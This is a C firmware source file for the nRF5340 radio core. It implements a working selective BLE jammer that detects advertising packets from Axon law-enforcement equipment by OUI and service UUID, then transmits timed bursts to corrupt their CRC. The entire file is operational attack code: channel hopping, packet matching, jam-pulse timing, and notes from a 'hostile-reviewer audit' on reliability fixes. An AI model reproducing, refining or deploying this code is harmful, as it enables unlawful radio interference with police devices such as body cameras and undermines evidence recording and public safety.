///////////////////////////////////////////////////////////////////////////
//
//   <~~~~~~~~~~>                i<~~~~i<~~~~i                                ---      ?-_   ---      ---   _--]           ---~           _--]     ?--   ]-----------l     -------]     --------?]     
//   ~++++++++++~~i              >~++++~~++++<                                ---      ---   ---]     ---   ----           ----           ----     ---   ------------?     --------     ----------     
//   ~++++~~~+++++~<  :i<<<<>:   >~++++~<~~~~!    !><<<>:       :><<<>:       ------   ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~++++~: >~+++~<!~++++++++~< >~++++~~++++<  >~~+++++~<>  :>~+++++++~<     --- ---- ---   ---]     ---   ----           ----           ----     ---   ----           ]---     ----   ---     ----   
//   ~+++++~~~~+++~i~~+++~~~+++~<>~++++~~++++<:~~+++~<~++++<:<~++~><~~++~>    --- --------   ---]     ---   ----           ----           ----     ---   ----------     ]------------   -----------?   
//   ~++++++++++~~i<~+++~  >++++~>~++++~~++++<<~+++~< !><<>il~++++++++++++>   ---   ------   ---]     ---   ----           ----           ---- --- ---   ----------     ]------------   ----------     
//   ~++++~<<<>>!  <++++~  i++++~>~++++~~++++<<~+++~> l<<<<i!~+++~~~~~~~~~:   ---      ---   ---]     ---   ----           ----           ---- --- ---   ----           ]---     ----   --- ---        
//   ~++++~>       :~++++~~~+++~>>~++++~~++++<:<~+++~~++++~<:<~++++~<~+++<    ---      ---   ---]     ---   ----           ----           ------ -----   ----           ]---     ----   ---   ----     
//   ~++++~>        :~++++++++~! >~++++~<++++<  i~~++++++~;   >~+++++++~>     ---      ---     --------     ------------   ------------   ----     ---   ------------?  ]---     ----   ---     ----   
//   :llll!            i<~~~>:   :!lll!::!lll:    :i~~~<!       i<~~~>:                                                                                                                                
//
//   https://github.com/jakka351/Project-Nullwear
//
//
//
/*
 * Project NULLWEAR — Network-core radio jammer (Rev v1.1.1)
 *
 * Copyright (c) 2026 Benjamin Jack Leighton, Tester Present Specialist
 * Automotive Solutions.
 *
 * SPDX-License-Identifier: MIT
 *
 * Runs on the nRF5340 network core (cpunet), which has direct access
 * to the 2.4 GHz RADIO peripheral. Performs selective per-packet
 * annihilation of BLE advertising packets emitted by Axon Enterprise
 * law-enforcement equipment.
 *
 * v1.1.1 — fixes after first hostile-reviewer audit:
 *   - Use Zephyr IRQ_CONNECT / IRQ_DIRECT_CONNECT (a bare
 *     XXX_IRQHandler symbol is not picked up; Zephyr installs its own
 *     vector table).
 *   - Move channel-hop timer from TIMER0 to TIMER1 (TIMER0 may be
 *     claimed by Zephyr or by other sub-systems; TIMER1 is free on
 *     nRF5340 cpunet by default).
 *   - Drop the unconditional DPPI link DISABLED -> TXEN. The link
 *     fired after every DISABLED, including normal RX end and
 *     channel-hop forced disable, causing accidental TX bursts.
 *     Replaced with a synchronous spin-wait inside launch_jam_pulse(),
 *     adding ~10 us of latency that remains comfortably within the
 *     empirically-validated CRC corruption window (Axon CRC region
 *     328-368 us; jam now starts at ~125 us, gives 200+ us margin).
 *   - radio_arm_rx() now restores RX SHORTS and clears stale
 *     EVENTS_BCMATCH before re-arming.
 *   - Channel-hop ISR no longer races the DISABLED handler: it sets
 *     the new channel and triggers DISABLE; the DISABLED handler is
 *     the single point of re-arming.
 *
 * Theory of operation, packet structure and timing budget unchanged
 * from prior revision — see docs/04-ble-crc-corruption.md.
 */

#include "radio_jammer.h"

#include <stdint.h>
#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/irq.h>
#include <hal/nrf_radio.h>
#include <hal/nrf_timer.h>

/*===========================================================================*/
/* Module state                                                              */
/*===========================================================================*/

static nullwear_radio_stats_t s_stats;

/* Buffer for received PDUs. Size easily covers PCNF1.MAXLEN (37) + S0 (1)
 * + LENGTH (1) = 39 bytes. Aligned per RADIO PACKETPTR requirements. */
static __attribute__((aligned(4))) uint8_t s_rx_buf[64];

/* Pre-built jam packet: 32-byte payload + 2-byte PDU header.
 * Content is irrelevant; we transmit on the same channel as the target
 * during its CRC region to corrupt the receiver's CRC validation. */
static __attribute__((aligned(4))) uint8_t s_jam_buf[40] = {
    0x00, 0x20,  /* PDU header: type=ADV_NONCONN_IND (0x02 in real BLE),
                  *             length 32 bytes (we don't care that this
                  *             is malformed; the receiver discards on
                  *             CRC failure of the original packet,
                  *             never decodes ours). */
    0xA5, 0xA5, 0xA5, 0xA5, 0xA5, 0xA5,   /* fake AdvA (won't decode) */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
};

/* Channel hop state. */
static const uint8_t s_channels[3] = {
    BLE_ADV_CH_37_FREQ_REG,
    BLE_ADV_CH_38_FREQ_REG,
    BLE_ADV_CH_39_FREQ_REG,
};
static const uint8_t s_whitening[3] = {
    BLE_WHITEN_CH_37,
    BLE_WHITEN_CH_38,
    BLE_WHITEN_CH_39,
};
static volatile uint8_t s_current_channel = 0;

/* Hop timer — TIMER1 on the network core. (TIMER0 avoided to prevent
 * collision with Zephyr / kernel sub-systems.) */
#define HOP_TIMER_INST    NRF_TIMER1
#define HOP_TIMER_IRQn    TIMER1_IRQn

/* v1.1 two-phase matcher state. Reset to 0 at the start of each RX,
 * advanced to 1 after a Phase-1 (OUI) miss to wait for Phase-2 BCMATCH. */
static volatile uint8_t s_match_phase = 0;

/*===========================================================================*/
/* Helpers                                                                   */
/*===========================================================================*/

static inline void radio_set_channel(uint8_t idx)
{
    NRF_RADIO->FREQUENCY   = s_channels[idx];
    NRF_RADIO->DATAWHITEIV = s_whitening[idx];
    s_current_channel      = idx;
}

static void radio_configure_for_rx(void)
{
    NRF_RADIO->MODE = RADIO_MODE_MODE_Ble_1Mbit << RADIO_MODE_MODE_Pos;

    NRF_RADIO->PCNF0 =
          (1U << RADIO_PCNF0_S0LEN_Pos)
        | (8U << RADIO_PCNF0_LFLEN_Pos)
        | (0U << RADIO_PCNF0_S1LEN_Pos)
        | (RADIO_PCNF0_PLEN_8bit << RADIO_PCNF0_PLEN_Pos);

    NRF_RADIO->PCNF1 =
          (37U << RADIO_PCNF1_MAXLEN_Pos)
        | (0U  << RADIO_PCNF1_STATLEN_Pos)
        | (3U  << RADIO_PCNF1_BALEN_Pos)
        | (RADIO_PCNF1_ENDIAN_Little   << RADIO_PCNF1_ENDIAN_Pos)
        | (RADIO_PCNF1_WHITEEN_Enabled << RADIO_PCNF1_WHITEEN_Pos);

    /* BLE primary-advertising access address 0x8E89BED6.
     * Programmed as base (low 24 bits) + prefix (high 8 bits). */
    NRF_RADIO->BASE0   = (BLE_ADV_ACCESS_ADDR << 8) & 0xFFFFFF00U;
    NRF_RADIO->PREFIX0 = (BLE_ADV_ACCESS_ADDR >> 24) & 0xFFU;
    NRF_RADIO->TXADDRESS   = 0;
    NRF_RADIO->RXADDRESSES = 1U;

    /* CRC: 24-bit, polynomial 0x65B, init 0x555555 (BLE 5.x §3.1.1). */
    NRF_RADIO->CRCCNF =
          (RADIO_CRCCNF_LEN_Three     << RADIO_CRCCNF_LEN_Pos)
        | (RADIO_CRCCNF_SKIPADDR_Skip << RADIO_CRCCNF_SKIPADDR_Pos);
    NRF_RADIO->CRCINIT = 0x00555555UL;
    NRF_RADIO->CRCPOLY = 0x0000065BUL;

    /* Initial BCC = Phase-1 trigger point. */
    NRF_RADIO->BCC = NULLWEAR_BCC_PHASE_OUI;

    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->TXPOWER   = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    /* RX-mode SHORTS: ramp up automatically after RXEN; start bit-counter
     * after access-address match; disable after END. */
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_ADDRESS_BCSTART_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    /* Enable interrupts: BCMATCH (matcher), END (stats), DISABLED (re-arm). */
    NRF_RADIO->INTENSET =
          RADIO_INTENSET_BCMATCH_Msk
        | RADIO_INTENSET_END_Msk
        | RADIO_INTENSET_DISABLED_Msk;
}

static void radio_arm_rx(void)
{
    /* Restore RX-mode SHORTS — launch_jam_pulse() overwrote them for TX. */
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_ADDRESS_BCSTART_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    /* Clear any stale events that could fire spuriously. */
    NRF_RADIO->EVENTS_BCMATCH  = 0;
    NRF_RADIO->EVENTS_END      = 0;
    NRF_RADIO->EVENTS_ADDRESS  = 0;

    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->BCC       = NULLWEAR_BCC_PHASE_OUI;
    s_match_phase        = 0;

    NRF_RADIO->TASKS_RXEN = 1;
}

static inline bool oui_matches_axon(const uint8_t *pdu)
{
    /* After Phase-1 BCMATCH (bit 64), pdu[5..7] are the OUI bytes
     * in on-air little-endian order. Axon = 00:25:DF, so on air the
     * sequence is DF, 25, 00 (LSByte first) — i.e. pdu[5]=0xDF,
     * pdu[6]=0x25, pdu[7]=0x00. */
    return (pdu[7] == NULLWEAR_TARGET_OUI_B0) &&
           (pdu[6] == NULLWEAR_TARGET_OUI_B1) &&
           (pdu[5] == NULLWEAR_TARGET_OUI_B2);
}

#if NULLWEAR_ENABLE_PHASE_2
static inline bool axon_service_uuid_present(const uint8_t *pdu)
{
    /* After Phase-2 BCMATCH (bit 128), pdu[8..15] hold the first 8
     * bytes of AdvData. We scan a small window for the 3-byte
     * signature [0x16][0x6B][0xFE] (Service Data 16-bit AD type +
     * UUID 0xFE6B little-endian on air).
     *
     * Empirical position in observed Axon broadcasts: pdu[11..13],
     * because Axon AdvData starts with the 3-byte Flags AD structure
     * (0x02 0x01 0x06) and then the FE6B Service Data AD structure.
     * Window pdu[8..13] covers reordered or differently-sized leading
     * structures while keeping the scan fast. */
    for (uint8_t i = 8; i + 2 <= 13; i++) {
        if (pdu[i]   == NULLWEAR_AD_TYPE_SERVICE_DATA_16BIT &&
            pdu[i+1] == NULLWEAR_AXON_SERVICE_UUID_LO &&
            pdu[i+2] == NULLWEAR_AXON_SERVICE_UUID_HI) {
            return true;
        }
    }
    return false;
}
#endif

/*===========================================================================*/
/* Jam-pulse pipeline                                                        */
/*===========================================================================*/

static inline void launch_jam_pulse(void)
{
    /* Synchronously abort RX: bring the radio to DISABLED. Spin is
     * bounded by the radio's ramp-down time (typ. <= 6 us at 1 Mbps). */
    NRF_RADIO->EVENTS_DISABLED = 0;
    NRF_RADIO->TASKS_DISABLE   = 1;
    while (NRF_RADIO->STATE != RADIO_STATE_STATE_Disabled) {
        /* spin */
    }
    NRF_RADIO->EVENTS_DISABLED = 0;     /* clear post-disable */

    /* Reconfigure for TX: load jam packet, set TX-mode SHORTS, fire. */
    NRF_RADIO->PACKETPTR = (uint32_t)s_jam_buf;
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    NRF_RADIO->TASKS_TXEN = 1;
    /* Radio ramps up TX (~40 us), transmits 32-byte payload (~336 us
     * including overhead), then END_DISABLE shortcut returns to
     * DISABLED and the DISABLED ISR re-arms RX. */

    s_stats.pkts_jammed++;
}

/*===========================================================================*/
/* RADIO ISR                                                                 */
/*===========================================================================*/

ISR_DIRECT_DECLARE(nullwear_radio_isr)
{
    /* BCMATCH: bit counter reached programmed threshold. */
    if (NRF_RADIO->EVENTS_BCMATCH) {
        NRF_RADIO->EVENTS_BCMATCH = 0;

        if (s_match_phase == 0) {
            /* Phase 1: OUI check. */
            if (oui_matches_axon(s_rx_buf)) {
                s_stats.pkts_oui_matched++;
                launch_jam_pulse();
                ISR_DIRECT_PM();
                return 1;
            }
#if NULLWEAR_ENABLE_PHASE_2
            /* OUI miss — re-arm BCC for Phase 2 inspection. */
            NRF_RADIO->BCC = NULLWEAR_BCC_PHASE_UUID;
            s_match_phase  = 1;
#endif
        } else {
#if NULLWEAR_ENABLE_PHASE_2
            /* Phase 2: Axon Service-Data UUID 0xFE6B. */
            if (axon_service_uuid_present(s_rx_buf)) {
                s_stats.pkts_uuid_matched++;
                launch_jam_pulse();
                ISR_DIRECT_PM();
                return 1;
            }
#endif
        }
    }

    /* END: a packet RX or TX finished. */
    if (NRF_RADIO->EVENTS_END) {
        NRF_RADIO->EVENTS_END = 0;
        s_stats.pkts_received_total++;
    }

    /* DISABLED: radio went idle. Re-arm for RX (whether we just
     * finished an RX, finished a jam TX, or were disabled by the
     * channel-hop timer — in all cases the right next action is
     * "go back to RX on the current channel"). */
    if (NRF_RADIO->EVENTS_DISABLED) {
        NRF_RADIO->EVENTS_DISABLED = 0;
        radio_arm_rx();
    }

    ISR_DIRECT_PM();
    return 1;
}

/*===========================================================================*/
/* Channel-hop timer ISR                                                     */
/*===========================================================================*/

static void hop_timer_isr(const void *unused)
{
    ARG_UNUSED(unused);
    if (HOP_TIMER_INST->EVENTS_COMPARE[0]) {
        HOP_TIMER_INST->EVENTS_COMPARE[0] = 0;

        /* Set the new channel. The FREQUENCY register is only sampled
         * by the radio at RXEN/TXEN time, so the upcoming radio_arm_rx()
         * (run from the RADIO DISABLED ISR) will pick it up. */
        s_current_channel = (uint8_t)((s_current_channel + 1) % 3);
        radio_set_channel(s_current_channel);

        /* Trigger a clean disable. The RADIO DISABLED ISR is the
         * single point of re-arm — no race. */
        NRF_RADIO->TASKS_DISABLE = 1;

        s_stats.channel_hops++;
    }
}

/*===========================================================================*/
/* Initialisation                                                            */
/*===========================================================================*/

static void hop_timer_start(void)
{
    HOP_TIMER_INST->MODE      = TIMER_MODE_MODE_Timer;
    HOP_TIMER_INST->BITMODE   = TIMER_BITMODE_BITMODE_32Bit;
    HOP_TIMER_INST->PRESCALER = 4;     /* 16 MHz / 16 = 1 MHz tick */
    HOP_TIMER_INST->CC[0]     = NULLWEAR_CH_DWELL_US;
    HOP_TIMER_INST->SHORTS    = TIMER_SHORTS_COMPARE0_CLEAR_Msk;
    HOP_TIMER_INST->INTENSET  = TIMER_INTENSET_COMPARE0_Msk;
    HOP_TIMER_INST->TASKS_CLEAR = 1;
    HOP_TIMER_INST->TASKS_START = 1;
}

void radio_jammer_start(void)
{
    memset(&s_stats, 0, sizeof(s_stats));

    radio_configure_for_rx();
    radio_set_channel(0);

    /* RADIO ISR — direct ISR for minimum latency on the matcher path. */
    IRQ_DIRECT_CONNECT(RADIO_IRQn, 0, nullwear_radio_isr, 0);
    irq_enable(RADIO_IRQn);

    /* Hop timer ISR — normal Zephyr ISR; 80 ms cadence so latency is
     * not critical. */
    IRQ_CONNECT(HOP_TIMER_IRQn, 1, hop_timer_isr, NULL, 0);
    irq_enable(HOP_TIMER_IRQn);

    hop_timer_start();
    radio_arm_rx();
}

void radio_jammer_stop(void)
{
    HOP_TIMER_INST->TASKS_STOP = 1;
    NRF_RADIO->TASKS_DISABLE   = 1;
    irq_disable(RADIO_IRQn);
    irq_disable(HOP_TIMER_IRQn);
}

void radio_jammer_get_stats(nullwear_radio_stats_t *out)
{
    if (out) {
        *out = s_stats;   /* word-aligned copies; ISR writes are word-atomic */
    }
}
